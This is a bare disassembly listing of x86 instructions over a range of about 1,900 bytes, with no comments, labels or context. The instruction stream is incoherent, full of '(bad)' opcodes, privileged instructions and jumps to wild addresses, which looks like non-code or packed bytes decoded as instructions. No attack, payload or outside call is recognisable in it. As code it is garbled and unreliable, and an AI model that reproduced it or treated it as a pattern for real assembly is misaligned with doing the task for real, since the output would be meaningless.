  4303ed:	add    BYTE PTR [ebp+0x50],cl
  4303f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4303f3:	mov    ebp,DWORD PTR [eax-0x68]
  4303f6:	test   DWORD PTR [eax],eax
  4303f8:	clc    
  4303f9:	push   DWORD PTR [ebp-0x1]
  4303fc:	lea    ecx,[eax]
  4303fe:	int3   
  4303ff:	inc    ebp
  430400:	call   0xfb3590
  430405:	jne    0x4303ff
  430407:	xor    edi,DWORD PTR [ebp-0x41]
  43040a:	jmp    0x43047e
  43040c:	mov    eax,DWORD PTR [eax]
  43040e:	mov    eax,0x339545c7
  430413:	inc    DWORD PTR [ebx]
  430415:	push   DWORD PTR [ecx]
  430417:	inc    ecx
  430418:	mov    eax,DWORD PTR [eax]
  43041a:	jmp    0x43046c
  43041c:	mov    eax,DWORD PTR [ebp-0x3c]
  43041f:	mov    eax,eax
  430421:	cld    
  430422:	clc    
  430423:	ret    
  430424:	test   bh,al
  430426:	pop    es
  430427:	xchg   ebp,eax
  430428:	add    bh,bh
  43042a:	inc    ebp
  43042b:	dec    DWORD PTR [edi]
  43042d:	sub    ebp,DWORD PTR [ebx]
  43042f:	add    BYTE PTR [eax],al
  430431:	push   eax
  430432:	jbe    0x430489
  430434:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43043a:	or     al,0xcf
  43043c:	inc    eax
  43043d:	enter  0x745,0x72
  430441:	inc    ebp
  430442:	mov    eax,DWORD PTR [ecx]
  430444:	int3   
  430445:	add    BYTE PTR [ebp-0x75],al
  430448:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43044e:	ror    BYTE PTR [ebp+0x72f80885],1
  430454:	inc    ebp
  430455:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43045b:	fadd   st,st(6)
  43045d:	rol    BYTE PTR [ebp+0x12],0x8b
  430461:	inc    ebp
  430462:	fmul   QWORD PTR [ebx-0x3c39233d]
  430468:	inc    ebp
  430469:	test   bh,al
  43046b:	fwait
  43046c:	clc    
  43046d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430473:	inc    ebp
  430474:	xor    esi,DWORD PTR [ebx]
  430476:	pushf  
  430477:	mov    ecx,0xffb48dc7
  43047c:	test   eax,ecx
  43047e:	clc    
  43047f:	dec    ebp
  430480:	inc    ebp
  430481:	mov    edi,DWORD PTR ds:0xc7c19c08
  430487:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43048e:	inc    ebp
  43048f:	inc    ebp
  430490:	aas    
  430491:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430498:	test   DWORD PTR [ecx],esi
  43049a:	clc    
  43049b:	pushf  
  43049c:	inc    ebp
  43049d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4304a3:	push   eax
  4304a4:	mov    BYTE PTR [edx],0x7d
  4304a7:	add    BYTE PTR [ebx],bh
  4304a9:	mov    ecx,DWORD PTR [edi]
  4304ab:	mov    DWORD PTR [eax],ebx
  4304ad:	les    eax,FWORD PTR [eax]
  4304af:	adc    ebp,ecx
  4304b1:	dec    ebp
  4304b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4304b8:	mov    ecx,esi
  4304ba:	lock or al,cl
  4304bd:	clc    
  4304be:	inc    ebp
  4304bf:	add    esi,DWORD PTR [ebx]
  4304c1:	jge    0x4304c6
  4304c3:	xor    edi,DWORD PTR [ebx]
  4304c5:	cmp    ecx,DWORD PTR [edi]
  4304c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4304cc:	mov    edi,DWORD PTR [ecx]
  4304ce:	test   al,0xcc
  4304d0:	dec    ebp
  4304d1:	test   BYTE PTR [ebx],dh
  4304d3:	pop    es
  4304d4:	xor    eax,DWORD PTR [eax]
  4304d6:	add    ecx,DWORD PTR [esi]
  4304d8:	add    ecx,eax
  4304da:	psraw  mm0,mm1
  4304dd:	sub    BYTE PTR [ebp+0x38],cl
  4304e0:	mov    edi,DWORD PTR [ebx]
  4304e2:	lock int3 
  4304e4:	shl    edx,1
  4304e6:	rol    BYTE PTR [ebp+0xc],1
  4304e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4304f0:	jmp    0x75053a
  4304f5:	pushf  
  4304f6:	inc    ebp
  4304f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4304fd:	xor    ecx,ebx
  4304ff:	add    ecx,esi
  430501:	mov    esi,eax
  430503:	enter  0x45af,0x8b
  430507:	xor    ecx,eax
  430509:	add    edx,DWORD PTR [ebp-0x77]
  43050c:	sub    ecx,DWORD PTR [eax]
  43050e:	cmp    eax,DWORD PTR [ebp+0x77]
  430511:	ror    DWORD PTR [ebx-0x76385764],1
  430517:	test   al,0x0
  430519:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43051f:	cmp    al,0x33
  430521:	pushf  
  430522:	xor    eax,edi
  430524:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43052b:	inc    ebp
  43052c:	dec    ebp
  43052d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430535:	test   DWORD PTR ds:0xeb4545f8,eax
  43053b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430541:	fdiv   QWORD PTR [ebx]
  430543:	dec    ebp
  430544:	xor    esi,DWORD PTR [ebx]
  430546:	add    eax,DWORD PTR [ebx]
  430548:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43054e:	dec    ebp
  43054f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430555:	out    dx,eax
  430556:	rol    BYTE PTR [eax],1
  430558:	add    eax,0xebc8458b
  43055d:	dec    ebp
  43055e:	mov    ebp,DWORD PTR [ebx]
  430560:	mov    esp,0x33f84d8b
  430565:	ret    
  430566:	xor    eax,esi
  430568:	add    ecx,eax
  43056a:	add    eax,DWORD PTR [edx+0xc1010f]
  430570:	dec    ebp
  430571:	inc    ebp
  430572:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430578:	ror    bl,1
  43057a:	add    eax,0xebc645ce
  43057f:	scas   eax,DWORD PTR es:[edi]
  430580:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430586:	xor    ebp,DWORD PTR [ebx]
  430588:	xor    edi,DWORD PTR [ebx]
  43058a:	add    esi,DWORD PTR [edi+0x3]
  43058d:	mov    ecx,DWORD PTR [edi]
  43058f:	clc    
  430590:	rol    ebx,0x4d
  430593:	(bad)  
  430594:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43059b:	mov    ah,0x45
  43059d:	dec    ebp
  43059e:	jbe    0x4305d3
  4305a0:	mov    esi,DWORD PTR [ebx]
  4305a2:	call   0x334652aa
  4305a7:	rdpmc  
  4305a9:	rol    DWORD PTR [ebx],0x4d
  4305ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305b2:	inc    ebp
  4305b3:	ror    BYTE PTR [ebx+0x45450808],1
  4305b9:	jmp    0x10b0649
  4305be:	inc    ebp
  4305bf:	inc    ebp
  4305c0:	(bad)  
  4305c1:	mov    ebx,eax
  4305c3:	clc    
  4305c4:	test   ebx,eax
  4305c6:	clc    
  4305c7:	retf   
  4305c8:	inc    ebp
  4305c9:	into   
  4305ca:	mov    esi,0x8b85afec
  4305d0:	clc    
  4305d1:	enter  0x5545,0x33
  4305d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4305dc:	ret    
  4305dd:	mov    ah,0xc6
  4305df:	addr16 push 0x338b4545
  4305e5:	clc    
  4305e6:	add    eax,ebx
  4305e8:	loopne 0x4305b5
  4305ea:	dec    ebp
  4305eb:	into   
  4305ec:	mov    al,dh
  4305ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4305f4:	inc    ebp
  4305f5:	push   ebp
  4305f6:	mov    ebp,DWORD PTR [ebx]
  4305f8:	in     al,dx
  4305f9:	cmp    eax,ebx
  4305fb:	ja     0x430642
  4305fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430603:	inc    ebp
  430604:	fwait
  430605:	mov    esi,DWORD PTR [edx]
  430607:	clc    
  430608:	mov    bl,al
  43060a:	xlat   BYTE PTR ds:[ebx]
  43060b:	retf   
  43060c:	inc    ebp
  43060d:	into   
  43060e:	mov    eax,esi
  430610:	in     al,dx
  430611:	scas   eax,DWORD PTR es:[edi]
  430612:	retf   
  430613:	mov    ecx,DWORD PTR [ebp-0x38]
  430616:	mov    edx,DWORD PTR [ebp-0x24]
  430619:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430620:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430627:	mov    eax,DWORD PTR [ebx]
  430629:	clc    
  43062a:	loopne 0x4305ef
  43062c:	push   ebp
  43062d:	retf   
  43062e:	mov    dh,al
  430630:	adc    esi,ecx
  430632:	jb     0x4305e3
  430634:	add    BYTE PTR [ebx+0x558bc845],cl
  43063a:	in     al,dx
  43063b:	sub    eax,ebx
  43063d:	cmp    ecx,ebx
  43063f:	mov    eax,esi
  430641:	mov    esp,0x45af03ce
  430646:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43064c:	mov    eax,ebx
  43064e:	in     al,dx
  43064f:	into   
  430650:	dec    ebp
  430651:	(bad)  
  430652:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430658:	rol    DWORD PTR [ebp+0x4d],0x89
  43065c:	xor    esp,esp
  43065e:	sub    eax,DWORD PTR [ebp-0x75]
  430661:	add    ebp,esp
  430663:	mov    al,0x55
  430665:	inc    ebp
  430666:	xor    esi,DWORD PTR [ecx]
  430668:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43066f:	inc    ebp
  430670:	xor    esi,DWORD PTR [edx]
  430672:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430679:	test   DWORD PTR [eax],eax
  43067b:	clc    
  43067c:	enter  0x8645,0x33
  430680:	inc    DWORD PTR [ebx]
  430682:	(bad)  
  430683:	jmp    0x4306ca
  430685:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43068b:	inc    ebp
  43068c:	(bad)  
  43068d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430693:	fwait
  430694:	retf   
  430695:	xor    al,cl
  430697:	mov    BYTE PTR [ebp+0xb],cl
  43069a:	lea    eax,[ebp+0x8]
  43069d:	xor    esi,DWORD PTR [edx+0x3]
  4306a0:	add    al,ah
  4306a2:	inc    ebp
  4306a3:	dec    ebp
  4306a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306aa:	gs add ch,cl
  4306ad:	inc    ebp
  4306ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306b4:	inc    ebp
  4306b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306bb:	push   ebp
  4306bc:	(bad)  
  4306bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4306c3:	add    ch,ch
  4306c5:	inc    ebp
  4306c6:	dec    DWORD PTR [ebx-0x34332775]
  4306cc:	add    al,0x4d
  4306ce:	inc    ebp
  4306cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4306d5:	fwait
  4306d6:	add    DWORD PTR [edx],esi
  4306d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4306de:	push   DWORD PTR [ebx]
  4306e0:	int3   
  4306e1:	xor    eax,DWORD PTR [eax]
  4306e3:	add    edx,DWORD PTR [eax+0x3]
  4306e6:	mov    DWORD PTR [edi],ecx
  4306e8:	call   0x4288c7ae
  4306ed:	mov    DWORD PTR [ebp-0x20],esp
  4306f0:	add    BYTE PTR [ebp+0x7d],al
  4306f3:	mov    eax,DWORD PTR [eax]
  4306f5:	in     al,0x15
  4306f7:	ret    
  4306f8:	iret   
  4306f9:	(bad)  
  4306fa:	enter  0x14af,0x8b
  4306fe:	(bad)  
  4306ff:	in     al,dx
  430700:	or     bl,cl
  430702:	adc    cl,al
  430704:	push   ebp
  430705:	dec    ebp
  430706:	inc    eax
  430707:	mov    edx,DWORD PTR [ebp-0x20]
  43070a:	jb     0x4306d7
  43070c:	mov    ecx,esi
  43070e:	cld    
  43070f:	scas   eax,DWORD PTR es:[edi]
  430710:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430717:	mov    BYTE PTR [eax],0x8c
  43071a:	push   0xffffff9b
  43071c:	push   edi
  43071d:	xor    dl,BYTE PTR [eax+0x3b]
  430720:	mov    ecx,DWORD PTR [edi]
  430722:	call   0x8c424c85
  430727:	mov    eax,eax
  430729:	in     al,dx
  43072a:	jge    0x430779
  43072c:	mov    DWORD PTR [ebx],esi
  43072e:	int3   
  43072f:	add    eax,DWORD PTR [ebp+0xf]
  430732:	xor    eax,ecx
  430734:	(bad)  
  430735:	dec    ebp
  430736:	pushf  
  430737:	xor    ecx,esi
  430739:	add    edi,DWORD PTR [edi]
  43073b:	mov    eax,DWORD PTR [ebp-0x38]
  43073e:	(bad)  
  43073f:	test   dh,dl
  430741:	fwait
  430742:	add    esi,DWORD PTR [edx]
  430744:	jmp    0x4306cf
  430746:	mov    cl,al
  430748:	add    eax,0x14330f45
  43074d:	mov    ecx,0xff468d80
  430752:	jmp    0xc990171f
  430757:	mov    edx,ecx
  430759:	rol    BYTE PTR [ebp+0x330155],1
  43075f:	add    ecx,DWORD PTR [ebp+0xf]
  430762:	xor    eax,edx
  430764:	(bad)  
  430765:	ror    DWORD PTR [eax],0x86
  430768:	jb     0x430767
  43076a:	add    bh,bh
  43076c:	clc    
  43076d:	inc    ebp
  43076e:	jb     0x4307da
  430770:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430776:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43077c:	shr    BYTE PTR [eax-0x3d],0x30
  430780:	clc    
  430781:	add    BYTE PTR [ebp+0x75],al
  430784:	xor    DWORD PTR [edx-0x64],ebp
  430787:	inc    edi
  430789:	adc    al,0xe8
  43078b:	inc    ebp
  43078c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430792:	mov    ecx,DWORD PTR [eax]
  430794:	cld    
  430795:	or     DWORD PTR [ebp-0x34],0x33
  430799:	jbe    0x43079e
  43079b:	mov    edx,DWORD PTR [ecx+0x2b]
  43079e:	dec    ebp
  43079f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307a5:	mov    BYTE PTR [ebx],dh
  4307a7:	mov    eax,DWORD PTR [ebx]
  4307a9:	or     BYTE PTR [ecx+0x3b],dl
  4307ac:	dec    ebp
  4307ad:	int3   
  4307ae:	xor    ebp,edi
  4307b0:	add    eax,DWORD PTR [ebp+0x51]
  4307b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4307b6:	xor    eax,DWORD PTR [eax]
  4307b8:	add    ebp,DWORD PTR [eax+0x51]
  4307bb:	adc    BYTE PTR [eax+0x0],0x8b
  4307bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4307c5:	inc    ebp
  4307c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4307cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4307d2:	dec    ebp
  4307d3:	mov    esi,DWORD PTR [ebx]
  4307d5:	hlt    
  4307d6:	add    eax,ebx
  4307d8:	push   ecx
  4307d9:	inc    ebp
  4307da:	dec    ebp
  4307db:	(bad)  
  4307dc:	call   esi
  4307de:	in     al,0xc7
  4307e0:	retf   
  4307e1:	mov    al,ds:0xc5ff3dce
  4307e6:	adc    al,0xc6
  4307e8:	inc    ebp
  4307e9:	and    eax,0x9c0f4c85
  4307ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4307f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4307f9:	mov    dh,0xc7
  4307fb:	cmp    eax,eax
  4307fd:	jne    0x45440049
  430803:	mov    esi,DWORD PTR [ebx]
  430805:	mov    eax,0x848bcb9c
  43080a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430811:	or     BYTE PTR [edi],cl
  430813:	(bad)  
  430814:	dec    ebp
  430815:	inc    edi
  430816:	add    bh,0x54
  430819:	or     cl,ch
  43081b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430821:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430828:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43082e:	(bad)  
  43082f:	cmp    eax,0x89839cff
  430834:	je     0x43081a
  430836:	inc    DWORD PTR [ebp+0x0]
  430839:	mov    ecx,DWORD PTR [ebp-0x340018]
  43083f:	into   
  430840:	dec    DWORD PTR [ebx-0x7f72431c]
  430846:	push   0x5000ff01
  43084b:	retf   
  43084c:	inc    ebp
  43084d:	into   
  43084e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430854:	push   eax
  430855:	into   
  430856:	call   0x4b0ce6
  43085b:	retf   
  43085c:	add    dh,cl
  43085e:	add    bh,bh
  430860:	mov    DWORD PTR [eax+ecx*1],edx
  430863:	clc    
  430864:	inc    ebp
  430865:	inc    ebp
  430866:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43086c:	push   0x1
  43086e:	push   edi
  43086f:	add    BYTE PTR [eax-0x35],dl
  430872:	mov    ecx,esi
  430874:	cld    
  430875:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43087b:	into   
  43087c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430883:	xor    eax,DWORD PTR [ebp+0x3]
  430886:	jne    0x4308d9
  430888:	call   DWORD PTR [eax-0x3c]
  43088b:	mov    DWORD PTR [ecx-0x18],edx
  43088e:	mov    edi,edi
  430890:	call   0x8b464e19
  430895:	add    ah,ah
  430897:	rol    BYTE PTR [ebp-0x7c],0xeb
  43089b:	add    edi,edi
  43089d:	add    al,ch
  43089f:	inc    ebp
  4308a0:	push   ecx
  4308a1:	cmp    al,0x8b
  4308a3:	pushf  
  4308a4:	(bad)  
  4308a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4308ac:	test   DWORD PTR [ebp-0x8],ecx
  4308af:	add    BYTE PTR [ebp+0x54],0x32
  4308b3:	jmp    0x8bcc9154
  4308b8:	in     al,dx
  4308b9:	or     BYTE PTR [ebp-0xf],al
  4308bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4308c2:	hlt    
  4308c3:	mov    eax,DWORD PTR [ebp-0x50]
  4308c6:	xor    esi,ecx
  4308c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4308ce:	inc    ebp
  4308cf:	adc    ecx,0x68
  4308d2:	pushf  
  4308d3:	inc    edi
  4308d5:	add    al,ch
  4308d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308d8:	test   edi,edi
  4308da:	clc    
  4308db:	inc    DWORD PTR [ebp-0x73]
  4308de:	cmp    al,0x74
  4308e0:	pushf  
  4308e1:	inc    edi
  4308e3:	push   ecx
  4308e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308e5:	jne    0x43086c
  4308e7:	push   eax
  4308e8:	clc    
  4308e9:	test   DWORD PTR [ebp-0x1],eax
  4308ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4308f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4308fa:	cmp    BYTE PTR [edx],bl
  4308fc:	pushf  
  4308fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430903:	add    BYTE PTR [ebx],dh
  430905:	inc    ebp
  430906:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  43090c:	enter  0x8401,0x0
  430910:	add    al,BYTE PTR [eax]
  430912:	add    bh,bh
  430914:	out    dx,eax
  430915:	sbb    BYTE PTR [eax],al
  430917:	dec    ebp
  430918:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43091e:	sub    esi,DWORD PTR [ebx]
  430920:	mov    ebp,DWORD PTR [eax-0x8]
  430923:	add    bl,0x0
  430926:	(bad)  
  430927:	cmp    eax,ecx
  430929:	or     BYTE PTR [edx+0x750114],al
  43092f:	inc    DWORD PTR [ebp+0x18]
  430932:	mov    eax,DWORD PTR [ebp-0x8]
  430935:	mov    ebx,eax
  430937:	(bad)  
  430938:	retf   
  430939:	inc    ebp
  43093a:	into   
  43093b:	mov    esi,eax
  43093d:	int3   
  43093e:	scas   eax,DWORD PTR es:[edi]
  43093f:	push   es
  430940:	mov    esi,DWORD PTR [ebp-0xc]
  430943:	call   DWORD PTR [ebp+0x18]
  430946:	sub    edi,DWORD PTR [ebp+0x3b]
  430949:	mov    esi,DWORD PTR [edi-0x34]
  43094c:	mov    eax,DWORD PTR [ebp-0x8]
  43094f:	xor    ebx,eax
  430951:	pushf  
  430952:	mov    bh,0xbc
  430955:	fadd   QWORD PTR [eax]
  430957:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  43095d:	mov    esi,DWORD PTR [ebx]
  43095f:	in     al,0x33
  430961:	ret    
  430962:	add    eax,esi
  430964:	add    eax,DWORD PTR [ebp+0xf]
  430967:	mov    eax,ecx
  430969:	in     al,0x4d
  43096b:	ret    
  43096c:	mov    eax,esi
  43096e:	in     al,dx
  43096f:	inc    ebp
  430970:	rol    edi,1
  430972:	sar    al,1
  430974:	or     BYTE PTR [ebp+0x45e9f845],al
  43097a:	add    BYTE PTR [ebx],dh
  43097c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430983:	test   ebx,eax
  430985:	clc    
  430986:	retf   
  430987:	inc    ebp
  430988:	into   
  430989:	cmp    eax,0xc7af9cc6
  43098e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430995:	inc    ebp
  430996:	cmp    edi,DWORD PTR [edi]
  430998:	ja     0x430936
  43099a:	mov    eax,edi
  43099c:	mov    esp,0x458567a8
  4309a1:	clc    
  4309a2:	mov    eax,DWORD PTR [ebp-0x8]
  4309a5:	mov    eax,ebx
  4309a7:	in     al,dx
  4309a8:	retf   
  4309a9:	ret    
  4309aa:	into   
  4309ab:	mov    dh,0x7d
  4309ae:	scas   eax,DWORD PTR es:[edi]
  4309af:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309b5:	add    BYTE PTR [ebx],ch
  4309b7:	jmp    0xba0af7
  4309bc:	mov    eax,DWORD PTR [ebp-0x5c]
  4309bf:	mov    eax,DWORD PTR [ebp-0x14]
  4309c2:	inc    ebp
  4309c3:	enter  0x458b,0xf8
  4309c7:	xor    eax,ebx
  4309c9:	add    ecx,ebx
  4309cb:	cmp    ecx,esi
  4309cd:	shufps xmm7,xmm4,0xaf
  4309d1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4309d7:	dec    ebp
  4309d8:	sub    esi,DWORD PTR [ebx]
  4309da:	cmp    esi,DWORD PTR [ebx]
  4309dc:	ja     0x4309e1
  4309de:	mov    eax,DWORD PTR [ebx]
  4309e0:	lods   al,BYTE PTR ds:[esi]
  4309e1:	mov    db0,ecx
  4309e4:	inc    ebp
  4309e5:	dec    ebp
  4309e6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4309ec:	retf   
  4309ed:	rol    dh,1
  4309ef:	or     al,0xce
  4309f1:	inc    ebp
  4309f2:	scas   eax,DWORD PTR es:[edi]
  4309f3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4309f9:	add    BYTE PTR [ebx],ch
  4309fb:	add    BYTE PTR [ebx],bh
  4309fd:	inc    ebp
  4309fe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a04:	inc    ebp
  430a05:	retf   
  430a06:	mov    ecx,esi
  430a08:	clc    
  430a09:	(bad)  
  430a0a:	retf   
  430a0b:	scas   eax,DWORD PTR es:[edi]
  430a0c:	ret    
  430a0d:	mov    ecx,esi
  430a0f:	hlt    
  430a10:	(bad)  
  430a11:	push   ebp
  430a12:	scas   eax,DWORD PTR es:[edi]
  430a13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a1f:	add    BYTE PTR [ebx],al
  430a21:	mov    eax,eax
  430a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a24:	inc    ebp
  430a25:	dec    ebp
  430a26:	xor    DWORD PTR [ebx],esi
  430a28:	pushf  
  430a29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430a2f:	rdmsr  
  430a31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430a39:	sar    eax,1
  430a3b:	rol    BYTE PTR [ebp+0x5],1
  430a3e:	xor    eax,DWORD PTR [ebp+0x3]
  430a41:	jmp    0x430a2e
  430a43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a49:	xor    eax,DWORD PTR [ebp+0x33]
  430a4c:	mov    eax,DWORD PTR [ebx]
  430a4e:	rol    BYTE PTR [ebx],1
  430a50:	test   BYTE PTR [edi],cl
  430a52:	fwait
  430a53:	shl    DWORD PTR [edx],0x4d
  430a56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430a5c:	xor    edx,eax
  430a5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430a64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430a6a:	add    BYTE PTR [ebx],dh
  430a6c:	inc    ebp
  430a6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430a73:	rdpmc  
  430a75:	rol    DWORD PTR [ebx],0x4d
  430a78:	loopne 0x430a05
  430a7a:	push   ebp
  430a7b:	in     al,dx
  430a7c:	mov    cl,dl
  430a7e:	adc    eax,edx
  430a80:	jb     0x430a87
  430a82:	add    BYTE PTR [ebp+0x45],al
  430a85:	jmp    0x430a12
  430a87:	mov    ebx,eax
  430a89:	test   al,0xcb
  430a8b:	dec    ebp
  430a8c:	dec    ebp
  430a8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430a93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430a99:	dec    ebp
  430a9a:	mov    al,0x8b
  430a9c:	dec    ebp
  430a9d:	in     al,dx
  430a9e:	xor    edx,ecx
  430aa0:	xor    edx,eax
  430aa2:	add    eax,DWORD PTR [ebp+0x3]
  430aa5:	jbe    0x430ab6
  430aa7:	mov    eax,ecx
  430aa9:	test   al,0x45
  430aab:	dec    ebp
  430aac:	mov    DWORD PTR [ebx],esi
  430aae:	loopne 0x430ae3
  430ab0:	inc    ebp
  430ab1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430ab7:	rol    esi,0x45
  430aba:	scas   eax,DWORD PTR es:[edi]
  430abb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430ac1:	mov    eax,ecx
  430ac3:	hlt    
  430ac4:	dec    ebp
  430ac5:	inc    ebp
  430ac6:	mov    eax,edi
  430ac8:	loopne 0x430aa2
  430aca:	retf   
  430acb:	test   esi,ecx
  430acd:	clc    
  430ace:	scas   eax,DWORD PTR es:[edi]
  430acf:	inc    ebp
  430ad0:	mov    eax,edi
  430ad2:	fdiv   st,st(0)
  430ad4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430ada:	fwait
  430adb:	xor    esi,DWORD PTR [edx]
  430add:	pushf  
  430ade:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430ae4:	inc    esi
  430ae6:	mov    ebp,DWORD PTR [eax-0x10]
  430ae9:	inc    ebp
  430aea:	dec    ebp
  430aeb:	xor    esi,DWORD PTR [ebx]
  430aed:	add    eax,DWORD PTR [ebx]
  430aef:	loopne 0x430b00
  430af1:	dec    ebp
  430af2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430af9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430aff:	lock fwait
  430b01:	ret    
  430b02:	xor    al,BYTE PTR [ebp-0x77]
  430b05:	mov    esi,esp
  430b07:	rol    BYTE PTR [ebp-0x7c],1
  430b0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430b10:	call   edi
  430b12:	enter  0x4d45,0x8b
  430b16:	mov    esi,eax
  430b18:	fmul   st(3),st
  430b1a:	push   ebp
  430b1b:	dec    ebp
  430b1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b22:	ret    0xc19b
  430b25:	xor    al,BYTE PTR [esi-0x280276]
  430b2b:	dec    ebp
  430b2c:	jne    0x430b61
  430b2e:	mov    eax,DWORD PTR [ebx]
  430b30:	cld    
  430b31:	loopne 0x430ae3
  430b33:	push   ebp
  430b34:	add    DWORD PTR [eax+0x72851100],ecx
  430b3a:	inc    DWORD PTR [eax]
  430b3c:	inc    DWORD PTR [ebp-0x75]
  430b3f:	mov    edi,esp
  430b41:	lock add bl,0x1
  430b45:	retf   
  430b46:	add    dh,al
  430b48:	xor    dh,cl
  430b4a:	inc    ebp
  430b4b:	scas   eax,DWORD PTR es:[edi]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	shl    al,0x0
  430b51:	inc    ebp
  430b52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b58:	call   0x461e90
  430b5d:	ud0    eax,ecx
  430b60:	adc    al,0x4d
  430b62:	inc    ebp
  430b63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430b69:	lock push 0x338055
  430b6f:	add    eax,DWORD PTR [eax]
  430b71:	ud0    ecx,edx
  430b74:	sbb    BYTE PTR [ebp+0x5e],dl
  430b77:	xor    ecx,ecx
  430b79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430b80:	push   ecx
  430b81:	add    BYTE PTR [ebp-0x38],cl
  430b84:	mov    DWORD PTR [esi-0x740004],eax
  430b8a:	cld    
  430b8b:	inc    ebp
  430b8c:	jmp    0x430b19
  430b8e:	mov    esp,esp
  430b90:	mov    ebx,eax
  430b92:	mov    eax,esi
  430b94:	clc    
  430b95:	scas   eax,DWORD PTR es:[edi]
  430b96:	icebp  
